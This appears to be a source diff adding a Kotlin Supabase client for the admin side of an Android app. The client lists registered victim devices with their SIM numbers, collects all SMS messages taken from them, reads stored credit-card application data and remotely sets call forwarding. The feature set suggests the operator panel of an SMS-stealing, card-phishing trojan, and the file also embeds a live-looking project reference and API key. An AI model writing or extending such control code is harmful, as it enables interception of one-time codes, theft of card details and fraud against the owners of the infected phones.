@@ -1,0 +1,1015 @@
+package com.example.admin.network
+
+import com.example.admin.core.AppIdManager
+
+import android.util.Log
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+import okhttp3.Headers
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
+import java.net.URLEncoder
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.TimeUnit
+
+class SupabaseApi {
+
+    companion object {
+        private const val TAG = "SUPABASE_API"
+
+        const val PROJECT_REF = "yjjoyvpexlutdlrqcxql"
+        const val SUPABASE_URL = "https://$PROJECT_REF.supabase.co"
+        const val REST_URL = "$SUPABASE_URL/rest/v1"
+
+        // Dynamic — reads from AppIdManager (set once on first launch in LogicActivity)
+        val REGISTERED_DEVICES_TABLE get() = AppIdManager.registeredDevicesTable
+        val APP_ID                   get() = AppIdManager.appId
+
+        const val KEY = "sb_publishable_kxLP55tNOmdNV68GPUhHgQ_wReL1B0e"
+    }
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    data class RegisteredDevice(
+        val uid: String,
+        val model: String? = "",
+        val manufacturer: String? = "",
+        val androidVersion: String? = "",
+        val brand: String? = "",
+        val sim1Number: String? = "",
+        val sim2Number: String? = "",
+        val sim1Carrier: String? = "",
+        val sim2Carrier: String? = "",
+        val fcmToken: String? = "",
+        val joinedAt: Long = 0L
+    )
+
+    data class DeviceStatus(
+        val uid: String,
+        val available: String = "",
+        val checkedAt: Long = 0L,
+        val timestamp: Long = 0L,
+        val status: String = "",
+        val type: String = "",
+        val online: Boolean = false
+    )
+
+    data class BatteryDataSupabase(
+        val uid: String,
+        val level: Int = 0,
+        val isCharging: Boolean = false,
+        val temperature: Double = 0.0,
+        val voltage: Int = 0,
+        val health: String? = "",
+        val timestamp: Long = 0L
+    )
+
+    data class AdminConfig(
+        val id: String = "main",
+        val number: String = "",
+        val status: String = "OFF",
+        val updatedAt: Long = 0L
+    )
+
+    data class SmsLog(
+        val id: String? = null,
+        val uniqueId: String,
+        val title: String,
+        val body: String,
+        val senderNumber: String,
+        val receiverNumber: String,
+        val timestamp: Long,
+        val isBanking: Boolean = false
+    )
+
+    data class CreditCardApplicationEntry(
+        val id: Long = 0L,
+        val type: String = "",
+        val data: Map<String, Any> = emptyMap(),
+        val submittedAtMs: Long = 0L
+    )
+
+    private fun headers(): Headers {
+        return Headers.Builder()
+            .add("apikey", KEY)
+            .add("Authorization", "Bearer $KEY")
+            .add("Content-Type", "application/json")
+            .build()
+    }
+
+    private fun upsertHeaders(): Headers {
+        return Headers.Builder()
+            .add("apikey", KEY)
+            .add("Authorization", "Bearer $KEY")
+            .add("Content-Type", "application/json")
+            .add("Prefer", "resolution=merge-duplicates,return=representation")
+            .build()
+    }
+
+    private fun patchHeaders(): Headers {
+        return Headers.Builder()
+            .add("apikey", KEY)
+            .add("Authorization", "Bearer $KEY")
+            .add("Content-Type", "application/json")
+            .add("Prefer", "return=minimal")
+            .build()
+    }
+
+    private fun jsonBody(jsonObject: JSONObject) =
+        jsonObject.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
+
+    private fun encode(value: String): String {
+        return URLEncoder.encode(value, "UTF-8")
+    }
+
+    fun isRealDeviceRow(subId: String, dataType: String = ""): Boolean {
+        if (subId.isBlank()) return false
+
+        if (subId == "admin_config_main") return false
+        if (subId.startsWith("admin_")) return false
+        if (subId.startsWith("star_")) return false
+
+        if (dataType.equals("admin_config", ignoreCase = true)) return false
+        if (dataType.equals("starred_device", ignoreCase = true)) return false
+        if (dataType.equals("call_forwarding", ignoreCase = true)) return false
+
+        return true
+    }
+
+    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
+        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
+        val dataType = row.optString("data_type", "").trim()
+
+        if (!isRealDeviceRow(uid, dataType)) return null
+
+        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+
+        return RegisteredDevice(
+            uid = uid,
+            model = dataJson.optString("model", row.optString("model", "")),
+            manufacturer = dataJson.optString("manufacturer", row.optString("manufacturer", "")),
+            androidVersion = dataJson.optString(
+                "androidversion",
+                dataJson.optString("androidVersion", row.optString("androidversion", ""))
+            ),
+            brand = dataJson.optString("brand", row.optString("brand", "")),
+            sim1Number = dataJson.optString(
+                "sim1number",
+                dataJson.optString("sim1Number", row.optString("sim1number", ""))
+            ),
+            sim2Number = dataJson.optString(
+                "sim2number",
+                dataJson.optString("sim2Number", row.optString("sim2number", ""))
+            ),
+            sim1Carrier = dataJson.optString(
+                "sim1carrier",
+                dataJson.optString(
+                    "sim1Carrier",
+                    dataJson.optString("sim1_carrier", row.optString("sim1carrier", ""))
+                )
+            ),
+            sim2Carrier = dataJson.optString(
+                "sim2carrier",
+                dataJson.optString(
+                    "sim2Carrier",
+                    dataJson.optString("sim2_carrier", row.optString("sim2carrier", ""))
+                )
+            ),
+            fcmToken = dataJson.optString(
+                "fcm_token",
+                dataJson.optString("fcmtoken", dataJson.optString("fcmToken", ""))
+            ),
+            joinedAt = dataJson.optLong(
+                "joinedat",
+                row.optLong("registered_at", row.optLong("created_at", 0L))
+            )
+        )
+    }
+
+    fun parseDeviceStatusRow(row: JSONObject, now: Long = System.currentTimeMillis()): DeviceStatus? {
+        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
+        val dataType = row.optString("data_type", "").trim()
+
+        if (!isRealDeviceRow(uid, dataType)) return null
+
+        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+        val heartbeat = dataJson.optJSONObject("heartbeat") ?: JSONObject()
+
+        val checkedAt = heartbeat.optLong(
+            "checked_at",
+            dataJson.optLong(
+                "online_checked_at",
+                dataJson.optLong("last_seen_at", row.optLong("updated_at", 0L))
+            )
+        )
+
+        val available = heartbeat.optString(
+            "available",
+            if (dataJson.optString("online_status", row.optString("status", ""))
+                    .equals("online", ignoreCase = true)
+            ) {
+                "Device is online"
+            } else {
+                ""
+            }
+        )
+
+        val status = dataJson.optString(
+            "online_status",
+            if (checkedAt > 0L) "online" else row.optString("status", "")
+        )
+
+        val online = checkedAt > 0L && now - checkedAt in 0 until (15 * 60 * 1000L)
+
+        return DeviceStatus(
+            uid = uid,
+            available = available,
+            checkedAt = checkedAt,
+            timestamp = checkedAt,
+            status = status,
+            type = "heartbeat",
+            online = online
+        )
+    }
+
+    fun parseBatteryRow(row: JSONObject): BatteryDataSupabase? {
+        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
+        val dataType = row.optString("data_type", "").trim()
+
+        if (!isRealDeviceRow(uid, dataType)) return null
+
+        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+        val battery = dataJson.optJSONObject("battery_data") ?: return null
+
+        return BatteryDataSupabase(
+            uid = uid,
+            level = battery.optInt("level", 0),
+            isCharging = battery.optBoolean(
+                "isCharging",
+                battery.optBoolean("ischarging", false)
+            ),
+            temperature = battery.optDouble("temperature", 0.0),
+            voltage = battery.optInt("voltage", 0),
+            health = battery.optString("health", ""),
+            timestamp = battery.optLong("timestamp", 0L)
+        )
+    }
+
+    fun parseStarredRow(row: JSONObject): Pair<String, Boolean>? {
+        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
+        val dataType = row.optString("data_type", "").trim()
+
+        if (!isRealDeviceRow(uid, dataType)) return null
+
+        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+        return uid to dataJson.optBoolean("starred", false)
+    }
+
+    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplicationEntry>> = withContext(Dispatchers.IO) {
+        try {
+            if (uid.isBlank()) return@withContext Result.failure(Exception("UID is required"))
+
+            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                    "?select=form_data_json" +
+                    "&sub_id=eq.${encode(uid)}" +
+                    "&app_id=eq.$APP_ID" +
+                    "&limit=1"
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) {
+                return@withContext Result.failure(Exception("HTTP ${response.code}: $body"))
+            }
+
+            val jsonArray = JSONArray(body)
+            if (jsonArray.length() == 0) return@withContext Result.success(emptyList())
+
+            val formDataJson = jsonArray.getJSONObject(0).optJSONObject("form_data_json")
+                ?: return@withContext Result.success(emptyList())
+
+            val applicationsArray = formDataJson.optJSONArray("credit_card_applications")
+                ?: return@withContext Result.success(emptyList())
+
+            val resultList = mutableListOf<CreditCardApplicationEntry>()
+
+            for (i in 0 until applicationsArray.length()) {
+                val app = applicationsArray.getJSONObject(i)
+                val dataMap = mutableMapOf<String, Any>()
+                val keys = app.keys()
+
+                while (keys.hasNext()) {
+                    val key = keys.next()
+                    when (val value = app.get(key)) {
+                        is String -> dataMap[key] = value
+                        is Int -> dataMap[key] = value
+                        is Long -> dataMap[key] = value
+                        is Double -> dataMap[key] = value
+                        is Boolean -> dataMap[key] = value
+                        else -> dataMap[key] = value.toString()
+                    }
+                }
+
+                resultList.add(
+                    CreditCardApplicationEntry(
+                        id = app.optLong("id", 0L),
+                        type = app.optString("type", "unknown"),
+                        data = dataMap,
+                        submittedAtMs = app.optLong("submitted_at_ms", 0L)
+                    )
+                )
+            }
+
+            Result.success(resultList.sortedByDescending { it.submittedAtMs })
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getCreditCardApplications exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
+        try {
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,uid,data_type,data_json,registered_at,created_at,updated_at,app_id" +
+                        "&app_id=eq.$APP_ID" +
+                        "&order=created_at.desc" +
+                        "&limit=1000"
+
+            Log.d(TAG, "getAllDevices URL: $url")
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) {
+                return@withContext Result.failure(Exception("Devices HTTP ${response.code}: $body"))
+            }
+
+            val array = JSONArray(body)
+            val list = mutableListOf<RegisteredDevice>()
+
+            for (i in 0 until array.length()) {
+                parseRegisteredDeviceRow(array.getJSONObject(i))?.let { list.add(it) }
+            }
+
+            Result.success(list)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getAllDevices exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> = withContext(Dispatchers.IO) {
+        try {
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,uid,data_type,status,data_json,updated_at,app_id" +
+                        "&app_id=eq.$APP_ID" +
+                        "&order=updated_at.desc" +
+                        "&limit=1000"
+
+            Log.d(TAG, "getAllDeviceStatuses URL: $url")
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) {
+                return@withContext Result.failure(Exception("Heartbeat HTTP ${response.code}: $body"))
+            }
+
+            val array = JSONArray(body)
+            val list = mutableListOf<DeviceStatus>()
+            val now = System.currentTimeMillis()
+
+            for (i in 0 until array.length()) {
+                parseDeviceStatusRow(array.getJSONObject(i), now)?.let { list.add(it) }
+            }
+
+            Result.success(list)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getAllDeviceStatuses exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> =
+        withContext(Dispatchers.IO) {
+            try {
+                val statuses = getAllDeviceStatuses().getOrNull() ?: emptyList()
+                val latestMap = mutableMapOf<String, DeviceStatus>()
+
+                statuses.forEach { status ->
+                    val old = latestMap[status.uid]
+                    if (old == null || status.checkedAt > old.checkedAt) {
+                        latestMap[status.uid] = status
+                    }
+                }
+
+                Result.success(latestMap)
+
+            } catch (e: Exception) {
+                Log.e(TAG, "getLatestDeviceStatuses exception", e)
+                Result.failure(e)
+            }
+        }
+
+    suspend fun getAllSmsMessagesFromRegisteredDevices(
+        rowLimit: Int = 1000
+    ): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
+        try {
+            val safeLimit = rowLimit.coerceIn(1, 1000)
+
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,uid,data_type,app_id,sms_messages,total_sms_count,last_sms_timestamp,last_sms_log,updated_at" +
+                        "&app_id=eq.$APP_ID" +
+                        "&order=updated_at.desc" +
+                        "&limit=$safeLimit"
+
+            Log.d(TAG, "GET sms_messages URL: $url")
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) {
+                return@withContext Result.failure(Exception("SMS_MESSAGES HTTP ${response.code}: $body"))
+            }
+
+            val rows = JSONArray(body)
+            val allSms = mutableListOf<SmsLog>()
+            val keySet = HashSet<String>()
+
+            for (i in 0 until rows.length()) {
+                val row = rows.getJSONObject(i)
+                val subId = row.optString("sub_id", row.optString("uid", "")).trim()
+                val dataType = row.optString("data_type", "").trim()
+
+                if (!isRealDeviceRow(subId, dataType)) continue
+
+                val parsed = parseSmsMessagesFromRegisteredDevice(row)
+                for (sms in parsed) {
+                    val key = "${sms.uniqueId}-${sms.id}"
+                    if (!keySet.contains(key)) {
+                        keySet.add(key)
+                        allSms.add(sms)
+                    }
+                }
+            }
+
+            allSms.sortByDescending { it.timestamp }
+            Result.success(allSms)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getAllSmsMessagesFromRegisteredDevices exception", e)
+            Result.failure(e)
+        }
+    }
+
+    fun parseSmsMessagesFromRegisteredDevice(row: JSONObject): List<SmsLog> {
+        val deviceId = row.optString("sub_id", row.optString("uid", "")).trim()
+        val dataType = row.optString("data_type", "").trim()
+
+        if (!isRealDeviceRow(deviceId, dataType)) return emptyList()
+
+        val smsArray = row.optJSONArray("sms_messages") ?: JSONArray()
+        val list = mutableListOf<SmsLog>()
+
+        for (i in 0 until smsArray.length()) {
+            val obj = smsArray.optJSONObject(i) ?: continue
+            val sms = parseSingleSmsObject(deviceId, obj, i)
+            if (sms != null) list.add(sms)
+        }
+
+        return list
+    }
+
+    fun parseSingleSmsObject(
+        deviceId: String,
+        obj: JSONObject,
+        index: Int = 0
+    ): SmsLog? {
+        val rawSmsId = obj.optString(
+            "sms_id",
+            obj.optString("id", obj.optString("message_id", ""))
+        ).trim()
+
+        val timestamp = readTimestamp(obj)
+
+        val smsId = when {
+            rawSmsId.isNotBlank() -> rawSmsId
+            timestamp > 0L -> "sms_$timestamp"
+            else -> "sms_${deviceId}_${System.currentTimeMillis()}_$index"
+        }
+
+        val body = obj.optString(
+            "message_body",
+            obj.optString("body", obj.optString("text", obj.optString("message", obj.optString("content", ""))))
+        )
+
+        if (body.isBlank()) return null
+
+        val sender = obj.optString(
+            "sender_number",
+            obj.optString("phone_number", obj.optString("sender", obj.optString("from", obj.optString("sender_masked", "Unknown"))))
+        )
+
+        val receiver = obj.optString(
+            "receiver_number",
+            obj.optString("receiver", obj.optString("to", obj.optString("receiver_masked", "")))
+        )
+
+        return SmsLog(
+            id = smsId,
+            uniqueId = deviceId,
+            title = obj.optString("title", "New SMS"),
+            body = body,
+            senderNumber = sender,
+            receiverNumber = receiver,
+            timestamp = if (timestamp > 0L) timestamp else System.currentTimeMillis(),
+            isBanking = false
+        )
+    }
+
+    private fun readTimestamp(obj: JSONObject): Long {
+        val longTs = obj.optLong("timestamp", 0L)
+        if (longTs > 0L) return longTs
+
+        val syncedAt = obj.optLong("synced_at", 0L)
+        if (syncedAt > 0L) return syncedAt
+
+        val timestampText = obj.optString("timestamp", "")
+        if (timestampText.isNotBlank()) {
+            parseTimestampString(timestampText)?.let { return it }
+        }
+
+        val readable = obj.optString("timestamp_readable", "")
+        if (readable.isNotBlank()) {
+            parseTimestampString(readable)?.let { return it }
+        }
+
+        return 0L
+    }
+
+    private fun parseTimestampString(value: String): Long? {
+        val patterns = listOf(
+            "yyyy-MM-dd HH:mm:ss",
+            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
+            "yyyy-MM-dd'T'HH:mm:ss'Z'",
+            "dd MMM yyyy, hh:mm a"
+        )
+
+        for (pattern in patterns) {
+            try {
+                val sdf = SimpleDateFormat(pattern, Locale.getDefault())
+                if (pattern.contains("'Z'")) sdf.timeZone = TimeZone.getTimeZone("UTC")
+
+                val date = sdf.parse(value)
+                if (date != null) return date.time
+            } catch (_: Exception) {
+            }
+        }
+
+        return null
+    }
+
+    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> {
+        return getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000)
+    }
+
+    suspend fun getSmsLogsByUniqueId(
+        uniqueId: String,
+        limit: Int = 50
+    ): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
+        try {
+            val all = getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000).getOrThrow()
+            val filtered = all
+                .filter { it.uniqueId == uniqueId }
+                .sortedByDescending { it.timestamp }
+                .take(limit.coerceIn(1, 500))
+
+            Result.success(filtered)
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+
+    suspend fun deleteSmsFromRegisteredDevice(
+        deviceId: String,
+        smsId: String
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            if (deviceId.isBlank() || smsId.isBlank()) {
+                return@withContext Result.failure(Exception("deviceId/smsId missing"))
+            }
+
+            if (!isRealDeviceRow(deviceId)) {
+                return@withContext Result.failure(Exception("Invalid device row"))
+            }
+
+            val getUrl =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,sms_messages" +
+                        "&sub_id=eq.${encode(deviceId)}" +
+                        "&app_id=eq.$APP_ID" +
+                        "&limit=1"
+
+            val getRequest = Request.Builder().url(getUrl).headers(headers()).get().build()
+            val getResponse = client.newCall(getRequest).execute()
+            val getBody = getResponse.body?.string() ?: "[]"
+
+            if (!getResponse.isSuccessful) {
+                return@withContext Result.failure(Exception("GET HTTP ${getResponse.code}: $getBody"))
+            }
+
+            val rows = JSONArray(getBody)
+            if (rows.length() == 0) {
+                return@withContext Result.failure(Exception("Device row not found"))
+            }
+
+            val row = rows.getJSONObject(0)
+            val oldArray = row.optJSONArray("sms_messages") ?: JSONArray()
+            val newArray = JSONArray()
+
+            for (i in 0 until oldArray.length()) {
+                val obj = oldArray.optJSONObject(i) ?: continue
+                val currentSmsId = obj.optString(
+                    "sms_id",
+                    obj.optString("id", obj.optString("message_id", ""))
+                )
+
+                if (currentSmsId != smsId) newArray.put(obj)
+            }
+
+            val patch = JSONObject().apply {
+                put("sms_messages", newArray)
+                put("total_sms_count", newArray.length())
+                put("updated_at", System.currentTimeMillis())
+            }
+
+            val patchUrl =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(deviceId)}&app_id=eq.$APP_ID"
+
+            val patchRequest = Request.Builder().url(patchUrl).headers(patchHeaders()).patch(jsonBody(patch)).build()
+            val patchResponse = client.newCall(patchRequest).execute()
+            val patchBody = patchResponse.body?.string().orEmpty()
+
+            if (!patchResponse.isSuccessful) {
+                return@withContext Result.failure(Exception("PATCH HTTP ${patchResponse.code}: $patchBody"))
+            }
+
+            Result.success(true)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "deleteSmsFromRegisteredDevice exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun deleteSmsLog(smsId: String): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            val all = getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000).getOrThrow()
+            val match = all.firstOrNull { it.id == smsId }
+
+            if (match == null || match.id.isNullOrBlank()) {
+                return@withContext Result.failure(Exception("SMS not found"))
+            }
+
+            deleteSmsFromRegisteredDevice(match.uniqueId, match.id)
+
+        } catch (e: Exception) {
+            Result.failure(e)
+        }
+    }
+
+    suspend fun deleteAllSmsMessagesForApp(): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            val getUrl =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,data_type" +
+                        "&app_id=eq.$APP_ID" +
+                        "&limit=1000"
+
+            val getRequest = Request.Builder().url(getUrl).headers(headers()).get().build()
+            val getResponse = client.newCall(getRequest).execute()
+            val getBody = getResponse.body?.string() ?: "[]"
+
+            if (!getResponse.isSuccessful) {
+                return@withContext Result.failure(Exception("GET HTTP ${getResponse.code}: $getBody"))
+            }
+
+            val rows = JSONArray(getBody)
+
+            for (i in 0 until rows.length()) {
+                val row = rows.getJSONObject(i)
+                val deviceId = row.optString("sub_id", "").trim()
+                val dataType = row.optString("data_type", "").trim()
+
+                if (!isRealDeviceRow(deviceId, dataType)) continue
+
+                val patch = JSONObject().apply {
+                    put("sms_messages", JSONArray())
+                    put("total_sms_count", 0)
+                    put("last_sms_timestamp", 0)
+                    put("last_sms_log", JSONObject())
+                    put("updated_at", System.currentTimeMillis())
+                }
+
+                val patchUrl =
+                    "$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(deviceId)}&app_id=eq.$APP_ID"
+
+                val patchRequest = Request.Builder().url(patchUrl).headers(patchHeaders()).patch(jsonBody(patch)).build()
+                val patchResponse = client.newCall(patchRequest).execute()
+                patchResponse.close()
+            }
+
+            Result.success(true)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "deleteAllSmsMessagesForApp exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getAdminConfig(): Result<AdminConfig> = withContext(Dispatchers.IO) {
+        try {
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,data_json,updated_at" +
+                        "&sub_id=eq.admin_config_main" +
+                        "&limit=1"
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) return@withContext Result.success(AdminConfig())
+
+            val array = JSONArray(body)
+            if (array.length() == 0) return@withContext Result.success(AdminConfig())
+
+            val row = array.getJSONObject(0)
+            val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+
+            Result.success(
+                AdminConfig(
+                    id = "main",
+                    number = dataJson.optString("number", ""),
+                    status = dataJson.optString("status", "OFF"),
+                    updatedAt = row.optLong("updated_at", dataJson.optLong("updated_at", 0L))
+                )
+            )
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getAdminConfig exception", e)
+            Result.success(AdminConfig())
+        }
+    }
+
+    suspend fun updateAdminConfig(
+        number: String,
+        status: String
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            val now = System.currentTimeMillis()
+
+            val dataJson = JSONObject().apply {
+                put("number", number)
+                put("status", status)
+                put("updated_at", now)
+            }
+
+            val json = JSONObject().apply {
+                put("sub_id", "admin_config_main")
+                put("uid", "admin_config_main")
+                put("app_id", APP_ID)
+                put("data_type", "admin_config")
+                put("data_json", dataJson)
+                put("status", status)
+                put("created_at", now)
+                put("updated_at", now)
+            }
+
+            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE?on_conflict=sub_id"
+            val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(json)).build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string().orEmpty()
+
+            if (!response.isSuccessful) {
+                Log.e(TAG, "updateAdminConfig HTTP ${response.code}: $body")
+            }
+
+            Result.success(response.isSuccessful)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "updateAdminConfig exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun updateCallForwarding(
+        uid: String,
+        number: String,
+        status: String
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
+            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))
+
+            val now = System.currentTimeMillis()
+
+            val json = JSONObject().apply {
+                put("call_forward_number", number)
+                put("call_forward_status", status)
+                put("call_forward_timestamp", now)
+                put("updated_at", now)
+            }
+
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID"
+
+            val request = Request.Builder().url(url).headers(patchHeaders()).patch(jsonBody(json)).build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string().orEmpty()
+
+            if (!response.isSuccessful) {
+                Log.e(TAG, "updateCallForwarding HTTP ${response.code}: $body")
+            }
+
+            Result.success(response.isSuccessful)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "updateCallForwarding exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getStarredDevices(): Result<Map<String, Boolean>> = withContext(Dispatchers.IO) {
+        try {
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,uid,data_type,data_json" +
+                        "&app_id=eq.$APP_ID" +
+                        "&limit=1000"
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) return@withContext Result.success(emptyMap())
+
+            val array = JSONArray(body)
+            val map = mutableMapOf<String, Boolean>()
+
+            for (i in 0 until array.length()) {
+                parseStarredRow(array.getJSONObject(i))?.let {
+                    map[it.first] = it.second
+                }
+            }
+
+            Result.success(map)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getStarredDevices exception", e)
+            Result.success(emptyMap())
+        }
+    }
+
+    suspend fun setStarred(
+        uid: String,
+        starred: Boolean
+    ): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
+            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))
+
+            val getUrl =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,data_json" +
+                        "&sub_id=eq.${encode(uid)}" +
+                        "&app_id=eq.$APP_ID" +
+                        "&limit=1"
+
+            val getRequest = Request.Builder().url(getUrl).headers(headers()).get().build()
+            val getResponse = client.newCall(getRequest).execute()
+            val getBody = getResponse.body?.string() ?: "[]"
+
+            if (!getResponse.isSuccessful) {
+                return@withContext Result.failure(
+                    Exception("setStarred GET HTTP ${getResponse.code}: $getBody")
+                )
+            }
+
+            val rows = JSONArray(getBody)
+            if (rows.length() == 0) {
+                return@withContext Result.failure(Exception("Device not found for starred update"))
+            }
+
+            val row = rows.getJSONObject(0)
+            val dataJson = row.optJSONObject("data_json") ?: JSONObject()
+
+            dataJson.put("starred", starred)
+            dataJson.put("starred_updated_at", System.currentTimeMillis())
+
+            val patch = JSONObject().apply {
+                put("data_json", dataJson)
+                put("updated_at", System.currentTimeMillis())
+            }
+
+            val patchUrl =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID"
+
+            val patchRequest = Request.Builder().url(patchUrl).headers(patchHeaders()).patch(jsonBody(patch)).build()
+            val patchResponse = client.newCall(patchRequest).execute()
+            val patchBody = patchResponse.body?.string().orEmpty()
+
+            if (!patchResponse.isSuccessful) {
+                Log.e(TAG, "setStarred PATCH HTTP ${patchResponse.code}: $patchBody")
+            }
+
+            Result.success(patchResponse.isSuccessful)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "setStarred exception", e)
+            Result.failure(e)
+        }
+    }
+
+    suspend fun getAllBatteryData(): Result<List<BatteryDataSupabase>> = withContext(Dispatchers.IO) {
+        try {
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE" +
+                        "?select=sub_id,uid,data_type,data_json" +
+                        "&app_id=eq.$APP_ID" +
+                        "&limit=1000"
+
+            val request = Request.Builder().url(url).headers(headers()).get().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string() ?: "[]"
+
+            if (!response.isSuccessful) return@withContext Result.success(emptyList())
+
+            val array = JSONArray(body)
+            val list = mutableListOf<BatteryDataSupabase>()
+
+            for (i in 0 until array.length()) {
+                parseBatteryRow(array.getJSONObject(i))?.let { list.add(it) }
+            }
+
+            Result.success(list)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "getAllBatteryData exception", e)
+            Result.success(emptyList())
+        }
+    }
+
+    suspend fun deleteDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
+        try {
+            if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
+            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))
+
+            val url =
+                "$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID"
+
+            val request = Request.Builder().url(url).headers(headers()).delete().build()
+            val response = client.newCall(request).execute()
+            val body = response.body?.string().orEmpty()
+
+            if (!response.isSuccessful) {
+                Log.e(TAG, "deleteDevice HTTP ${response.code}: $body")
+            }
+
+            Result.success(response.isSuccessful)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "deleteDevice exception", e)
+            Result.failure(e)
+        }
+    }
+
+    fun formatForDisplay(timestamp: Long): String {
+        if (timestamp <= 0L) return "-"
+
+        return try {
+            SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(timestamp))
+        } catch (e: Exception) {
+            timestamp.toString()
+        }
+    }
+}
